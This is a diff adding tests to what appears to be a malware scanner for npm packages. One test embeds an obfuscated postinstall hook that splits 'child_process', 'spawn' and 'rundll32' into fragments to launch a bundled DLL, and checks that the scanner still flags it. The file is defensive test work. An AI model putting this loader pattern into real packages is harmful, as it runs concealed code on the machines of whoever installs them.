@@ -219,3 +219,30 @@ class TestMinifiedEntryIsNotOffscreenCode:
         result = Scanner(Config.default().with_overrides(use_cache=False)).scan(archive)
         found = [f for f in result.findings if f.rule_id == "SUSPECT.OBFUSCATION.LONGLINE.001"]
         assert all(f.severity <= Severity.LOW for f in found)
+
+
+class TestWindowsLoaderAtInstall:
+    """eslint-config-prettier 8.10.1 / 9.1.1 / 10.1.7 (2025): a bundled DLL run by rundll32 from
+    `postinstall`, every name split into fragments (review 98)."""
+
+    MANIFEST = '{"name": "x", "version": "1.0.0", "scripts": {"postinstall": "node install.js"}}'
+
+    def test_split_names_still_block(self, tmp_path) -> None:
+        hook = (
+            "const path = require('path');\n"
+            'require(\'chi\'+\'ld_pro\'+\'cess\')["sp"+"awn"]("rund"+"ll32",\n'
+            "  [path.join(__dirname, './helper' + '.dll') + ',main']);\n"
+        )
+        found = {
+            f.rule_id
+            for f in Helpers.findings(tmp_path, {"package.json": self.MANIFEST, "install.js": hook})
+        }
+        assert "MALWARE.INSTALL.WINDOWS_LOADER.001" in found
+
+    def test_a_build_spawn_is_not_a_loader(self, tmp_path) -> None:
+        hook = "require('child_process').spawn('node', ['build.js'], {stdio: 'inherit'});\n"
+        found = {
+            f.rule_id
+            for f in Helpers.findings(tmp_path, {"package.json": self.MANIFEST, "install.js": hook})
+        }
+        assert "MALWARE.INSTALL.WINDOWS_LOADER.001" not in found
